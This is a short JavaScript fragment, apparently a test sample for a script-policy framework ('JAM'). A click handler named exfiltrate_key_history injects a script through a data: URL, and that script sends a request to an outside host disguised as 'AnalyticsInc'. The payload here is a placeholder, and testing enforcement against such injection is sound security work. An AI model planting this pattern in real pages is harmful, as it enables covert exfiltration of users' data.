
JAM.startProfile('load');
function exfiltrate_key_history(){var data='xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=data1", true);xmlhttp.send(null);',data=encodeURIComponent(data),URL="data:text/javascript;,"+data,data=document.createElement("script");data.src=URL;URL=document.getElementsByTagName("head");URL=URL[0];JAMScript.call(URL.appendChild,URL,[data])}var v2=document.getElementById("test");JAMScript.set(v2,"onclick",exfiltrate_key_history);

JAM.stopProfile('load');
